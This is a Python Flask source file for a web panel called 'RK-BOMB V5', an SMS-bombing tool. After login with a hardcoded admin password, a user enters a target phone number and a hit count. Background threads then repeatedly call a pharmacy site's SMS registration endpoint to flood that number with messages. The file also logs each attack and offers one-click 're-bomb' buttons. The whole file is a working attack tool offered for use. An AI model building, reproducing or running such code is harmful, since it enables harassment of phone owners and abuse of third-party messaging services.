import requests
import threading
import os
import time
import sqlite3
import random
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.secret_key = os.urandom(32)

# ---------- DATABASE ENGINE ----------
def get_db():
    conn = sqlite3.connect('rk_v5_pro.db', check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db() as conn:
        conn.execute('''CREATE TABLE IF NOT EXISTS history (
            id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, phone TEXT, 
            success INTEGER, fail INTEGER, total INTEGER, limit_amt INTEGER, 
            status TEXT, start_time TEXT, stop_time TEXT, duration TEXT, 
            date_str TEXT, timestamp DATETIME)''')
        conn.execute("CREATE TABLE IF NOT EXISTS users (username TEXT UNIQUE, password TEXT, status TEXT)")
        try:
            conn.execute("INSERT INTO users VALUES (?, ?, ?)", ("admin", generate_password_hash("admin123"), "active"))
        except: pass

init_db()

# ---------- CORE BOMBING LOGIC ----------
active_sessions = {}

def bombing_task(username, phone, limit, start_dt):
    key = f"{username}_{phone}"
    # Multiple APIs for stability
    api_list = ["https://shop.pharmaid-rx.com/api/sendSMSRegistration?mobileNumber={}"]

    while key in active_sessions:
        curr = active_sessions[key]
        if curr['total_sent'] >= curr['limit'] or curr['status'] == 'Stopped': break
        
        if curr['status'] == 'Running':
            try:
                # Update Running Time
                elapsed = datetime.now() - start_dt
                active_sessions[key]['running_time'] = str(elapsed).split('.')[0]
                
                res = requests.get(random.choice(api_list).format(phone), timeout=8)
                if res.status_code == 200:
                    active_sessions[key]['success'] += 1
                    active_sessions[key]['new_hit'] = True
                else:
                    active_sessions[key]['fail'] += 1
            except:
                active_sessions[key]['fail'] += 1
            
            active_sessions[key]['total_sent'] += 1
            time.sleep(1.6)
        else:
            time.sleep(1)

    # Database Logging
    stop_dt = datetime.now()
    final = active_sessions.get(key)
    if final:
        with get_db() as conn:
            conn.execute('''INSERT INTO history 
                (username, phone, success, fail, total, limit_amt, status, start_time, stop_time, duration, date_str, timestamp) 
                VALUES (?,?,?,?,?,?,?,?,?,?,?,?)''',
                (username, phone, final['success'], final['fail'], final['total_sent'], final['limit'], "Completed", 
                 final['start_at'], stop_dt.strftime("%I:%M:%S %p"), final['running_time'], start_dt.strftime("%d/%m/%Y"), start_dt))
        del active_sessions[key]

# ---------- NEON ANIMATED UI ----------
LAYOUT = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RK-BOMB V5 ULTRA</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
    <style>
        :root { --neon: #00ffcc; --bg: #030303; --card: #0a0a0a; --red: #ff3131; --blue: #00d4ff; --gold: #ffcc00; }
        body { background: var(--bg); color: var(--neon); font-family: 'Rajdhani', sans-serif; margin: 0; overflow-x: hidden; }
        
        /* Navbar */
        .nav { background: rgba(0,0,0,0.9); padding: 15px 20px; border-bottom: 2px solid var(--neon); display: flex; justify-content: space-between; align-items: center; position: sticky; top:0; z-index:1000; backdrop-filter: blur(10px); }
        .logo { font-family: 'Orbitron'; font-size: 1.3rem; text-shadow: 0 0 10px var(--neon); }
        
        .container { padding: 20px; max-width: 700px; margin: auto; }
        
        /* Search Bar Animation */
        .search-box { position: relative; margin-bottom: 20px; }
        .search-box input { width: 100%; padding: 12px 40px; background: #111; border: 1px solid #333; border-radius: 25px; color: #fff; outline: none; transition: 0.4s; }
        .search-box input:focus { border-color: var(--neon); box-shadow: 0 0 15px rgba(0,255,204,0.3); }

        /* Card System */
        .card { background: var(--card); border: 1px solid #1a1a1a; border-radius: 15px; padding: 20px; margin-bottom: 20px; position: relative; transition: 0.4s ease; animation: slideIn 0.5s ease-out; }
        @keyframes slideIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        .card:hover { border-color: var(--neon); box-shadow: 0 10px 20px rgba(0,0,0,0.8); }

        /* Stats Grid */
        .stats-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin: 15px 0; }
        .stat-item { background: #111; padding: 10px; border-radius: 8px; border: 1px solid #222; text-align: center; }
        .stat-item label { display: block; font-size: 11px; color: #888; text-transform: uppercase; margin-bottom: 4px; }
        .stat-item span { font-family: 'Orbitron'; font-size: 14px; color: #fff; }

        /* Buttons */
        .fire-btn { background: var(--neon); color: #000; border: none; padding: 12px; border-radius: 8px; font-weight: bold; cursor: pointer; font-family: 'Orbitron'; font-size: 12px; transition: 0.3s; width: 100%; box-shadow: 0 0 10px rgba(0,255,204,0.2); }
        .fire-btn:hover { background: #fff; box-shadow: 0 0 20px var(--neon); }
        .btn-red { background: var(--red); color: #fff; }
        .btn-gold { background: var(--gold); color: #000; }

        /* Progress Bar Animation */
        .prog-bg { background: #111; height: 8px; border-radius: 4px; overflow: hidden; margin: 10px 0; border: 1px solid #222; }
        .prog-bar { height: 100%; background: linear-gradient(90deg, var(--neon), var(--blue)); transition: 0.6s cubic-bezier(0.4, 0, 0.2, 1); position: relative; }
        .prog-bar::after { content: ''; position: absolute; top:0; left:0; right:0; bottom:0; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent); animation: sweep 2s infinite; }
        @keyframes sweep { 0% { transform: translateX(-100%); } 100% { transform: translateX(100%); } }

        .live-dot { height: 10px; width: 10px; background: var(--red); border-radius: 50%; display: inline-block; animation: blink 1s infinite; margin-right: 5px; }
        @keyframes blink { 0% { opacity: 1; box-shadow: 0 0 5px var(--red); } 50% { opacity: 0.3; } 100% { opacity: 1; } }

        .nav-links a { color: #fff; text-decoration: none; margin-left: 15px; font-weight: bold; font-size: 0.9rem; transition: 0.3s; }
        .nav-links a:hover { color: var(--neon); }
    </style>
</head>
<body>
    <audio id="snd_hit" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>
    <audio id="snd_start" src="https://assets.mixkit.co/active_storage/sfx/2571/2571-preview.mp3"></audio>

    <div class="nav">
        <div class="logo">RK-BOMB <span style="color:#fff">V5</span></div>
        <div class="nav-links">
            <a href="/dashboard">DASHBOARD</a>
            <a href="/history">HISTORY</a>
            <a href="/logout" style="color:var(--red)">LOGOUT</a>
        </div>
    </div>

    <div class="container">[CONTENT]</div>

    <script>
        function playSnd(id) { let s = document.getElementById(id); if(s){ s.currentTime=0; s.play().catch(e=>{}); } }
        
        function sync(){
            let engine = document.getElementById('live-engine');
            if(!engine) return;
            fetch('/api/status').then(r=>r.json()).then(data=>{
                let html = '';
                for(let k in data){
                    let s = data[k];
                    if(s.new_hit) playSnd('snd_hit');
                    let p = (s.total_sent/s.limit)*100;
                    html += `
                    <div class="card">
                        <div style="display:flex; justify-content:space-between; align-items:center;">
                            <b style="font-size:1.1rem; color:#fff">📱 ${s.phone}</b>
                            <span style="font-size:12px; color:var(--neon)"><span class="live-dot"></span>${s.status}</span>
                        </div>
                        <div class="prog-bg"><div class="prog-bar" style="width:${p}%"></div></div>
                        <div class="stats-grid">
                            <div class="stat-item"><label>Success</label><span>${s.success}</span></div>
                            <div class="stat-item"><label>Failed</label><span>${s.fail}</span></div>
                            <div class="stat-item"><label>Total Sent</label><span>${s.total_sent}/${s.limit}</span></div>
                            <div class="stat-item"><label>Start Time</label><span>${s.start_at}</span></div>
                        </div>
                        <div style="text-align:center; font-size:12px; color:#666; margin-bottom:15px;">
                            ⏱ RUNNING TIME: <span style="color:var(--blue)">${s.running_time}</span>
                        </div>
                        <div style="display:flex; gap:10px;">
                            <button class="fire-btn btn-gold" onclick="location.href='/api/control?num=${s.phone}&action=${s.status==='Running'?'Paused':'Running'}'">
                                ${s.status==='Running'?'PAUSE':'RESUME'}
                            </button>
                            <button class="fire-btn btn-red" onclick="location.href='/api/stop?num=${s.phone}'">TERMINATE</button>
                        </div>
                    </div>`;
                }
                engine.innerHTML = html;
            });
        }
        setInterval(sync, 1500);

        function filterHistory() {
            let val = document.getElementById('searchKey').value.toLowerCase();
            let cards = document.querySelectorAll('.history-card');
            cards.forEach(c => {
                c.style.display = c.innerText.toLowerCase().includes(val) ? 'block' : 'none';
            });
        }
    </script>
</body>
</html>
'''

# ---------- ROUTING ENGINE ----------
@app.route('/')
def root(): return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        u, p = request.form.get('u'), request.form.get('p')
        with get_db() as conn:
            user = conn.execute("SELECT * FROM users WHERE username=?", (u,)).fetchone()
        if user and check_password_hash(user['password'], p):
            session['user'] = u
            return redirect(url_for('dashboard'))
    return render_template_string(LAYOUT.replace('[CONTENT]', '<div class="card" style="text-align:center;"><h3>SYSTEM LOGIN</h3><form method="POST"><input name="u" placeholder="Admin ID" style="margin-bottom:10px;"><input name="p" type="password" placeholder="Passcode"><button class="fire-btn" style="margin-top:20px;">ACCESS SYSTEM</button></form></div>'))

@app.route('/dashboard')
def dashboard():
    if 'user' not in session: return redirect(url_for('login'))
    return render_template_string(LAYOUT.replace('[CONTENT]', '''
        <div class="card" style="border-left: 5px solid var(--neon);">
            <h3 style="margin:0; color:var(--neon)">🚀 ATTACK PANEL</h3>
            <p style="font-size:12px; color:#666;">Enter details to initiate high-speed bombing</p>
            <form action="/api/start" onsubmit="playSnd('snd_start')">
                <input name="num" placeholder="Target Number (e.g. 018...)" required>
                <input name="amt" type="number" placeholder="Hit Count (Max 1000)" max="1000" required>
                <button class="fire-btn" style="margin-top:10px;">LAUNCH ATTACK</button>
            </form>
        </div>
        <div id="live-engine"></div>
    '''))

@app.route('/history')
def history():
    if 'user' not in session: return redirect(url_for('login'))
    with get_db() as conn:
        groups = conn.execute("SELECT phone, COUNT(*) as sessions, SUM(success) as total_hits FROM history GROUP BY phone ORDER BY id DESC").fetchall()
        total_attacks = conn.execute("SELECT COUNT(*) FROM history").fetchone()[0]
    
    html = f'''
        <div class="stat-item" style="margin-bottom:20px; border-color:var(--neon)">
            <label>Global Attack Records</label><span style="font-size:24px; color:var(--neon)">{total_attacks}</span>
        </div>
        <div class="search-box">
            <input type="text" id="searchKey" placeholder="Search by number..." onkeyup="filterHistory()">
        </div>
        <div id="history-list">
    '''
    for g in groups:
        html += f'''
        <div class="card history-card" style="border-left: 3px solid var(--blue);">
            <div style="display:flex; justify-content:space-between; align-items:center;">
                <b style="font-size:1.1rem;">📱 {g['phone']}</b>
                <span class="badge" style="color:var(--blue)">{g['sessions']} Sessions</span>
            </div>
            <div style="font-size:13px; color:#aaa; margin:10px 0;">Total Success Hits: <span style="color:var(--neon)">{g['total_hits']}</span></div>
            <div style="display:flex; gap:10px;">
                <button class="fire-btn" style="width:auto; flex:1; background:#111; color:var(--blue); border:1px solid var(--blue);" onclick="location.href='/history/detail/{g['phone']}'">VIEW ALL LOGS</button>
                <button class="fire-btn" style="width:auto; flex:1;" onclick="location.href='/api/start?num={g['phone']}&amt=100'">RE-BOMB (100)</button>
            </div>
        </div>'''
    html += '</div>'
    return render_template_string(LAYOUT.replace('[CONTENT]', html))

@app.route('/history/detail/<phone>')
def history_detail(phone):
    if 'user' not in session: return redirect(url_for('login'))
    with get_db() as conn:
        logs = conn.execute("SELECT * FROM history WHERE phone=? ORDER BY timestamp DESC", (phone,)).fetchall()
    
    html = f'<h3 style="color:var(--blue)">Detailed Logs: {phone}</h3><a href="/history" style="color:#666; text-decoration:none; font-size:14px;">← Back</a><br><br>'
    for l in logs:
        html += f'''
        <div class="card" style="font-size:13px; background:#0a0a0a;">
            <div style="display:flex; justify-content:space-between; border-bottom:1px solid #1a1a1a; padding-bottom:5px; margin-bottom:10px;">
                <b>{l['date_str']}</b> <span>{l['start_time']}</span>
            </div>
            <div class="stats-grid">
                <div class="stat-item"><label>Hits</label><span style="color:var(--neon)">{l['success']}</span></div>
                <div class="stat-item"><label>Fails</label><span style="color:var(--red)">{l['fail']}</span></div>
                <div class="stat-item"><label>Limit</label><span>{l['limit_amt']}</span></div>
                <div class="stat-item"><label>Time</label><span>{l['duration']}</span></div>
            </div>
        </div>'''
    return render_template_string(LAYOUT.replace('[CONTENT]', html))

# ---------- API ENDPOINTS ----------
@app.route('/api/start')
def api_start():
    u, num, amt = session.get('user'), request.args.get('num'), request.args.get('amt')
    if u and num and amt:
        now = datetime.now()
        active_sessions[f"{u}_{num}"] = {
            'phone': num, 'success': 0, 'fail': 0, 'total_sent': 0, 'limit': int(amt), 
            'status': 'Running', 'start_at': now.strftime("%I:%M:%S %p"), 
            'running_time': '00:00:00', 'new_hit': False
        }
        threading.Thread(target=bombing_task, args=(u, num, int(amt), now), daemon=True).start()
    return redirect(url_for('dashboard'))

@app.route('/api/status')
def api_status():
    u = session.get('user', '')
    data = {k: v for k, v in active_sessions.items() if k.startswith(u)}
    res = jsonify(data)
    for k in data: active_sessions[k]['new_hit'] = False
    return res

@app.route('/api/control')
def api_control():
    key = f"{session.get('user')}_{request.args.get('num')}"
    if key in active_sessions: active_sessions[key]['status'] = request.args.get('action')
    return redirect(url_for('dashboard'))

@app.route('/api/stop')
def api_stop():
    key = f"{session.get('user')}_{request.args.get('num')}"
    if key in active_sessions: active_sessions[key]['status'] = 'Stopped'
    return redirect(url_for('dashboard'))

@app.route('/logout')
def logout(): session.clear(); return redirect(url_for('login'))

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
